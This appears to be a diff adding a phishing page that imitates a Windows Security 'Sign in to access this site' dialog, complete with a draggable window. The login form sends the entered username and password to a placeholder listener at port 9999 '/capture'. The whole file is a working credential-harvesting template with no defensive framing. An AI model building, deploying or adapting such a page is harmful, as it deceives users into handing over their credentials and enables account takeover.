@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <meta http-equiv="Cache-Control" content="no-store" />
+  <link href="https://fonts.googleapis.com/css2?family=Reddit+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: "Reddit Sans", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+    }
+    #HeaderTD, #ctl00_Menu1_MN {
+      display: none;
+    }
+    .login-window {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 456px;
+      height: 281px;
+      transform: translate(-50%, -50%);
+      background-color: #e6e6e6;
+      border: 1px solid #0078d7;
+      border-radius: 0;
+      box-sizing: border-box;
+    }
+    .login-header {
+      padding: 8px 24px 0;
+      cursor: default;
+    }
+    .login-content {
+      padding: 0 23px;
+    }
+    .form-group {
+      margin-bottom: 12px;
+    }
+    .form-group.submission {
+      margin-bottom: 0;
+      white-space: nowrap;
+    }
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .form-group input[type="text"],
+    .form-group input[type="password"] {
+      width: 300px;
+      padding: 8px 9px 7px;
+      border: 1px solid #7a7a7a;
+      background: #f0f0f0;
+      box-sizing: border-box;
+      border-radius: 0;
+    }
+    .form-group input[type="text"]::placeholder,
+    .form-group input[type="password"]::placeholder {
+      color: #626262;
+      opacity: 1;
+    }
+    .form-group input[type="text"]:hover,
+    .form-group input[type="password"]:hover {
+      border-color: #5c5c5c;
+      background: #f5f5f5;
+    }
+    .form-group input[type="text"]:focus,
+    .form-group input[type="password"]:focus {
+      border-color: #0078d7;
+      background: #ffffff;
+      color: #000;
+      outline: none;
+    }
+    .form-group input[type="text"]:focus::placeholder,
+    .form-group input[type="password"]:focus::placeholder {
+      color: #999;
+    }
+    .form-group input[type="submit"] {
+      padding: 7px;
+      background-color: #b8b8b8;
+      border: 2px solid #b8b8b8;
+      color: #000;
+      border-radius: 0;
+      width: 49.5%;
+      box-sizing: border-box;
+      display: inline-block;
+      white-space: normal;
+    }
+    .form-group input[type="submit"]:hover {
+      border-color: #6e6e6e;
+    }
+    .no-highlight {
+      user-select: none;
+      -moz-user-select: none;
+      -webkit-text-select: none;
+      -webkit-user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-window no-highlight" id="loginWindow">
+    <div class="login-header" id="loginHeader">
+      <span style="font-size: 12px;">Windows Security</span>
+      <p style="font-size: 21px; margin-top: 11px; margin-bottom: 19px;">Sign in to access this site</p>
+      <p style="font-size: 14px; margin: 14px 0 17px;">Authorization required by http://website.com</p>
+    </div>
+    <div class="login-content">
+      <form method="POST" action="http://[FakeWindowsAuthListenerIP]:9999/capture">
+        <fieldset style="border: none; margin: 0; padding: 0;">
+          <div class="form-group">
+            <input type="text" id="UserNameText" name="username" placeholder="User name" required />
+          </div>
+          <div class="form-group" style="margin-bottom: 32px;">
+            <input type="password" id="PasswordText" name="password" placeholder="Password" required />
+          </div>
+          <div class="form-group submission">
+            <input type="submit" value="OK" />
+            <input type="submit" value="Cancel" />
+          </div>
+        </fieldset>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const loginWindow = document.getElementById('loginWindow');
+    const loginHeader = document.getElementById('loginHeader');
+    let offsetX, offsetY;
+
+    loginHeader.addEventListener('mousedown', startDrag);
+
+    function startDrag(event) {
+      event.preventDefault();
+      offsetX = event.clientX - loginWindow.getBoundingClientRect().left;
+      offsetY = event.clientY - loginWindow.getBoundingClientRect().top;
+      document.addEventListener('mousemove', drag);
+      document.addEventListener('mouseup', stopDrag);
+    }
+
+    function drag(event) {
+      loginWindow.style.left = event.clientX - offsetX + 'px';
+      loginWindow.style.top = event.clientY - offsetY + 'px';
+    }
+
+    function stopDrag() {
+      document.removeEventListener('mousemove', drag);
+      document.removeEventListener('mouseup', stopDrag);
+    }
+  </script>
+</body>
+</html>
